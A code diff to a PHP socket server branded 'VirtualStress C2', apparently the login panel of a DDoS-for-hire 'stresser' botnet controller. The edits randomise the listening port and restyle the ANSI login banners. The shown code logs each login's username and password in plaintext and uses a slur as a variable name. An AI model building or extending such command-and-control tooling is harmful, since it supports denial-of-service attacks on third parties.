@@ -25,15 +25,14 @@ $auth = new AUTH();
 
 $hostn = $config->CNC_Info["Hostname"];
 
-if(count($argv) < 1) die("Error, Missing argument\r\nUsage ". $argv[0]. " <port>");
 $address = file_get_contents("https://api.ipify.org");
-$port = $argv[1];
+$port = rand(100, 65500);
 
 $sock = socket_create(AF_INET, SOCK_STREAM, 0);
 socket_bind($sock, $address, $port) or die('Could not bind to address');
 socket_listen($sock);
 socket_set_nonblock($sock);
-
+echo "Server started on PORT; [$port]\r\n";
 // Loop continuously
 while (true)
 {
@@ -54,13 +53,15 @@ while (true)
 
     if ($newsock = @socket_accept($sock))
     {
-        socket_write($newsock, $banner->login_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->login_bnnr($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
-        socket_write($newsock, "\033[17;15f", strlen("\033[17;15f"));
-        socket_write($newsock, "\033[8;18;36t", strlen("\033[8;18;36t"));
-        socket_write($newsock, "Welcome To VirtualStress C2!\r\n", strlen("Welcome To VirtualStress C2!\r\n"));
+        $usrname = alt_getInput($newsock, $config->Colors["Clear"]. $banner->main_banner(), 3);
+        $passwd = alt_getInput($newsock, $config->Colors["Clear"]. $banner->pass(), 3);
+        socket_write($newsock, "\033[13;16f", strlen("\033[13;16f"));
+        socket_write($newsock, "\033[8;15;39t", strlen("\033[8;15;39t"));
+        // socket_write($newsock, $config->Colors["Clear"]. $banner->main_banner(), strlen($config->Colors["Clear"]. $banner->main_banner()));
+        // socket_write($newsock, "Welcome To VirtualStress C2!\r\n", strlen("Welcome To VirtualStress C2!\r\n"));
         socket_getpeername($newsock, $client_ip, $client_port);
-        $usrname = alt_getInput($newsock, "Username: ", 3);
-        $passwd = alt_getInput($newsock, "Password: ", 3);
+        // $usrname = alt_getInput($newsock, $config->Colors["Clear"]. $banner->main_banner(), 3);
+        // $passwd = alt_getInput($newsock, "Password: ", 3);
         echo "# [ NEW LOGIN ATTEMPT ] #\r\n$usrname | $passwd\r\n\r\n";
         $gay = $crud->user($client_ip, "all");
         echo $gay. "\r\n";
